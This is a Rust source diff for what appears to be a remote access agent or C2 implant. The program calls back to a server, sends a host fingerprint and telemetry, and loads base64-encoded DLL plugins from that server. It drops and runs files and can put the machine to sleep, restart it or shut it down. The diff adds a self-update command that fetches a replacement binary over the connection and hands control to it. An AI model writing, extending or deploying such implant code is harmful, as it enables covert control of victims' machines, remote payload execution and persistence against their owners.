@@ -1,13 +1,25 @@
 use std::{
-    io::{BufRead, BufReader, ErrorKind, Write},
-    net::TcpStream,
+    io::{self, BufRead, BufReader, ErrorKind, Write},
+    net::{Shutdown, TcpStream},
     thread,
     time::Duration,
 };
 
-use crate::{plugin::Manager, sys, telemetry, text};
+use crate::{plugin::Manager, sys, telemetry, text, update};
+
+const MAX_WIRE_LINE: usize = update::MAX_UPDATE_BYTES * 4 / 3 + 1024;
+
+enum SessionOutcome {
+    Normal,
+    Close,
+    Update(update::PreparedUpdate),
+}
 
 pub fn run(ip: &str, port: u16) {
+    run_with_handoff(ip, port, None);
+}
+
+pub fn run_with_handoff(ip: &str, port: u16, mut handoff: Option<update::ChildHandoff>) {
     let fp = telemetry::fingerprint();
     let host = telemetry::host(&fp);
     let mut plugins = Manager::new();
@@ -22,13 +34,34 @@ pub fn run(ip: &str, port: u16) {
                 if send(&mut stream, &format!("{}{}", text::HELLO, fp)).is_ok()
                     && send(&mut stream, &format!("{}{}", text::DATA, data)).is_ok()
                 {
+                    if let Some(handoff) = handoff.take() {
+                        if handoff.signal_ready_and_schedule_cleanup().is_err() {
+                            let _ = stream.shutdown(Shutdown::Both);
+                            let _ = sys::release_single();
+                            return;
+                        }
+                    }
                     println!("{}", text::CONNECTED);
                     plugins.event("agent.connected", host.as_bytes());
-                    if session(&mut stream, ip, &fp, &host, &mut plugins) {
-                        plugins.clear();
-                        return;
+                    match session(&mut stream, ip, port, &fp, &host, &mut plugins) {
+                        SessionOutcome::Normal => {
+                            plugins.clear();
+                        }
+                        SessionOutcome::Close => {
+                            plugins.clear();
+                            return;
+                        }
+                        SessionOutcome::Update(pending) => {
+                            let _ = stream.shutdown(Shutdown::Both);
+                            plugins.clear();
+                            match pending.finish_after_disconnect() {
+                                Ok(()) => std::process::exit(0),
+                                Err(err) => {
+                                    eprintln!("update handoff failed: {err}");
+                                }
+                            }
+                        }
                     }
-                    plugins.clear();
                 }
             }
             Err(_) => {}
@@ -39,8 +72,15 @@ pub fn run(ip: &str, port: u16) {
     }
 }
 
-fn session(stream: &mut TcpStream, ip: &str, fp: &str, host: &str, plugins: &mut Manager) -> bool {
-    let Ok(clone) = stream.try_clone() else { return false; };
+fn session(
+    stream: &mut TcpStream,
+    ip: &str,
+    port: u16,
+    fp: &str,
+    host: &str,
+    plugins: &mut Manager,
+) -> SessionOutcome {
+    let Ok(clone) = stream.try_clone() else { return SessionOutcome::Normal; };
     let mut reader = BufReader::new(clone);
 
     loop {
@@ -54,6 +94,31 @@ fn session(stream: &mut TcpStream, ip: &str, fp: &str, host: &str, plugins: &mut
             }
             Ok(Some(value)) if value.starts_with(text::CMD) => {
                 let raw = value[text::CMD.len()..].trim();
+
+                if raw.to_ascii_uppercase().starts_with(text::UPDATE) {
+                    let rest = raw[text::UPDATE.len()..].trim();
+                    let (filename, b64) = match rest.split_once(':') {
+                        Some((name, data)) => (name.trim(), data.trim()),
+                        None => {
+                            let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE));
+                            continue;
+                        }
+                    };
+                    let Some(bytes) = update::decode_b64_update(b64) else {
+                        let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE));
+                        continue;
+                    };
+                    match update::prepare(ip, port, filename, &bytes) {
+                        Ok(pending) => {
+                            let _ = send(stream, &format!("{}{}{}", text::ACK, text::UPDATE, pending.filename()));
+                            return SessionOutcome::Update(pending);
+                        }
+                        Err(_) => {
+                            let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE));
+                        }
+                    }
+                    continue;
+                }
 
                 // CMD:PLUGIN:<id>:<base64-dll-bytes>
                 if raw.to_ascii_uppercase().starts_with(text::PLUGIN) {
@@ -132,28 +197,28 @@ fn session(stream: &mut TcpStream, ip: &str, fp: &str, host: &str, plugins: &mut
                 match cmd.as_str() {
                     text::RECONNECT => {
                         let _ = send(stream, &format!("{}{}", text::ACK, cmd));
-                        return false;
+                        return SessionOutcome::Normal;
                     }
                     text::CLOSE => {
                         let _ = send(stream, &format!("{}{}", text::ACK, cmd));
                         println!("{}", text::CLOSED);
-                        return true;
+                        return SessionOutcome::Close;
                     }
                     text::SLEEP | text::HIBERNATE | text::RESTART | text::SHUTDOWN => {
                         let ok = sys::command(&cmd);
                         let _ = send(stream, &format!("{}{}", if ok { text::ACK } else { text::ERR }, cmd));
                         plugins.event("agent.command", cmd.as_bytes());
-                        if ok { return true; }
+                        if ok { return SessionOutcome::Close; }
                     }
                     _ => {}
                 }
             }
             Ok(Some(_)) => {}
-            Ok(None) => return false,
+            Ok(None) => return SessionOutcome::Normal,
             Err(e) if matches!(e.kind(), ErrorKind::TimedOut | ErrorKind::WouldBlock) => {
                 let _ = send(stream, text::HB);
             }
-            Err(_) => return false,
+            Err(_) => return SessionOutcome::Normal,
         }
     }
 }
@@ -182,7 +247,6 @@ fn drop_and_run(bytes: &[u8], ext: &str) -> std::io::Result<()> {
     Ok(())
 }
 
-// Minimal base64 decoder (RFC 4648, no padding requirement)
 fn decode_b64(s: &str) -> Option<Vec<u8>> {
     let s = s.trim();
     let mut out = Vec::with_capacity(s.len() * 3 / 4);
@@ -209,12 +273,33 @@ fn decode_b64(s: &str) -> Option<Vec<u8>> {
     Some(out)
 }
 
-fn line(r: &mut BufReader<TcpStream>) -> std::io::Result<Option<String>> {
-    let mut s = String::new();
-    Ok(match r.read_line(&mut s)? {
-        0 => None,
-        _ => Some(s.trim_end_matches(['\r', '\n']).to_owned()),
-    })
+fn line(r: &mut BufReader<TcpStream>) -> io::Result<Option<String>> {
+    let mut data = Vec::with_capacity(256);
+    loop {
+        let chunk = r.fill_buf()?;
+        if chunk.is_empty() {
+            if data.is_empty() {
+                return Ok(None);
+            }
+            return Err(io::Error::new(ErrorKind::UnexpectedEof, "unterminated command"));
+        }
+        if let Some(pos) = chunk.iter().position(|b| *b == b'\n') {
+            if data.len() + pos > MAX_WIRE_LINE {
+                return Err(io::Error::new(ErrorKind::InvalidData, "command exceeds size limit"));
+            }
+            data.extend_from_slice(&chunk[..pos]);
+            r.consume(pos + 1);
+            return String::from_utf8(data)
+                .map(Some)
+                .map_err(|_| io::Error::new(ErrorKind::InvalidData, "command is not UTF-8"));
+        }
+        if data.len() + chunk.len() > MAX_WIRE_LINE {
+            return Err(io::Error::new(ErrorKind::InvalidData, "command exceeds size limit"));
+        }
+        data.extend_from_slice(chunk);
+        let len = chunk.len();
+        r.consume(len);
+    }
 }
 
 fn send(stream: &mut TcpStream, s: &str) -> std::io::Result<()> {
